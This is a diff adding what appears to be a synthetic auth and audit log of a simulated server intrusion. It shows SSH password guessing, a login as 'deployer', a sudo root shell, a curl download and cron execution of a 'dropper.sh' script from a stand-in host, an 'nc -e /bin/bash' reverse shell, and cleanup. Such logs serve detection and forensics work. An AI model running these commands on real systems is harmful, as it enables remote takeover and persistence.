@@ -1,0 +1,21 @@
+Mar 15 10:14:01 prod-srv-01 sshd[18201]: Failed password for invalid user admin from 198.51.100.12 port 51230 ssh2
+Mar 15 10:14:04 prod-srv-01 sshd[18201]: Failed password for invalid user test from 198.51.100.12 port 51234 ssh2
+Mar 15 10:14:08 prod-srv-01 sshd[18201]: Failed password for invalid user guest from 198.51.100.12 port 51238 ssh2
+Mar 15 10:14:12 prod-srv-01 sshd[18201]: Failed password for invalid user support from 198.51.100.12 port 51242 ssh2
+Mar 15 10:14:15 prod-srv-01 sshd[18201]: Failed password for root from 198.51.100.12 port 51246 ssh2
+Mar 15 10:14:30 prod-srv-01 sshd[18205]: Invalid user deployer from 198.51.100.12
+Mar 15 10:15:00 prod-srv-01 sshd[18210]: Accepted password for deployer from 198.51.100.12 port 51250 ssh2
+Mar 15 10:15:01 prod-srv-01 sshd[18210]: pam_unix(sshd:session): session opened for user deployer
+type=USER_LOGIN msg=audit(1710501301.120:501): pid=18210 uid=1001 auid=1001 ses=3 msg='op=login id=1001 exe="/usr/sbin/sshd" hostname=? addr=198.51.100.12 terminal=ssh res=success'
+Mar 15 10:16:22 prod-srv-01 sudo:   deployer : TTY=pts/0 ; PWD=/home/deployer ; USER=root ; COMMAND=/bin/bash
+type=EXECVE msg=audit(1710501382.450:502): pid=18255 uid=0 auid=1001 ses=3 exe="/bin/bash" msg='cwd="/root"'
+Mar 15 10:17:10 prod-srv-01 sudo:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://198.51.100.77/dropper.sh -o /tmp/dropper.sh
+type=EXECVE msg=audit(1710501430.780:503): pid=18290 uid=0 auid=1001 ses=3 exe="/usr/bin/curl" msg='cwd="/tmp"'
+Mar 15 10:17:35 prod-srv-01 sudo:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/dropper.sh
+Mar 15 10:18:00 prod-srv-01 CRON[18350]: (root) CMD (/tmp/dropper.sh > /dev/null 2>&1)
+Mar 15 10:18:45 prod-srv-01 sudo:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/nc -e /bin/bash 198.51.100.77 4444
+type=EXECVE msg=audit(1710501525.105:504): pid=18385 uid=0 auid=1001 ses=3 exe="/bin/nc" msg='cwd="/root"'
+Mar 15 10:19:15 prod-srv-01 kernel: [ 5812.301920] iptables denied packet: IN=eth0 OUT= SRC=198.51.100.12 DST=10.0.1.50 PROTO=TCP SPT=4444 DPT=80
+Mar 15 10:19:50 prod-srv-01 sudo:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/rm -f /tmp/dropper.sh
+Mar 15 10:20:00 prod-srv-01 sshd[18210]: pam_unix(sshd:session): session closed for user deployer
+Mar 15 10:20:01 prod-srv-01 sshd[18210]: Connection closed by 198.51.100.12 port 51250
